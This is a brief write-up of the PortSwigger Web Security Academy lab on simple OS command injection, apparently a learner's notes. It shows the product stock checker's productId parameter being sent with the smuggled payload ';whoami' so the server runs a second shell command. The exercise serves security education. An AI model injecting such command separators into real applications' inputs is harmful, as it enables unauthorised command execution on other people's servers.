# OS Command Injection — Simple Case



## Definition



**OS Command Injection** is a vulnerability that occurs when user-controlled input is incorporated into an 
operating system command, allowing an attacker to execute unintended commands on the server.





## Lab



**PortSwigger Web Security Academy — OS command injection, simple case**

**Difficulty:** Apprentice



The vulnerability was found in the **product stock checker**, where the `productId` value was included in a shell 
command.



### Normal request



```http

productId=1&storeId=1

```



### Payload



```text


;whoami

```



Sent as:



```http

productId=1;whoami&storeId=1

```



The `;` acts as a command separator, causing `whoami` to be executed as a separate command.



Because the application returns the command's raw output in the response, the current OS user was revealed.



### Key Takeaway



```text

User Input → Shell Command → Command Injection → OS Command Execution

```



**Result:** Lab solved ✅



[PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection?utm_source=chatgpt.
com)
